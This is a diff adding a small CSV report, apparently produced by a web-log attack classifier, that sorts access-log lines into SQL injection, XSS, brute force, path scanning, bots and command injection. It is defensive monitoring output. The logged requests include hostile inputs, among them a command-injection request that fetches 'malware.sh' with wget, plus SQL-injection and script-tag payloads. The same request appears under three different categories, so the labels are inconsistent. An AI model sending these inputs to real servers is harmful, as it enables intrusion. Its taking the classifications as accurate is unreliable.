@@ -1,0 +1,12 @@
+IP,AttackType,Details
+N/A,SQL Injection,185.220.101.1 - - [12/May/2026:10:20:11 +0000] "GET /?id=1%20OR%201=1 HTTP/1.1" 200 1024
+N/A,SQL Injection,51.222.253.12 - - [12/May/2026:10:23:33 +0000] "GET /shell?cd+/tmp;wget+malware.sh HTTP/1.1" 400 128
+N/A,XSS,185.220.101.1 - - [12/May/2026:10:20:12 +0000] "GET /search.php?q=<script>alert('xss')</script> HTTP/1.1" 400 256
+N/A,Brute Force,91.132.136.56 3
+N/A,Path Scanning,45.155.205.233 - - [12/May/2026:10:16:01 +0000] "GET /wp-login.php HTTP/1.1" 404 1024
+N/A,Path Scanning,185.234.219.55 - - [12/May/2026:10:16:22 +0000] "GET /admin/ HTTP/1.1" 403 512
+N/A,Path Scanning,103.21.244.0 - - [12/May/2026:10:17:45 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 256
+N/A,Path Scanning,185.199.110.153 - - [12/May/2026:10:22:55 +0000] "GET /wp-admin/admin-ajax.php HTTP/1.1" 404 256
+N/A,Bots / Scrapers,66.249.66.1 - - [12/May/2026:10:21:01 +0000] "GET /robots.txt HTTP/1.1" 200 88
+N/A,Bots / Scrapers,51.222.253.12 - - [12/May/2026:10:23:33 +0000] "GET /shell?cd+/tmp;wget+malware.sh HTTP/1.1" 400 128
+N/A,Command Injection,51.222.253.12 - - [12/May/2026:10:23:33 +0000] "GET /shell?cd+/tmp;wget+malware.sh HTTP/1.1" 400 128
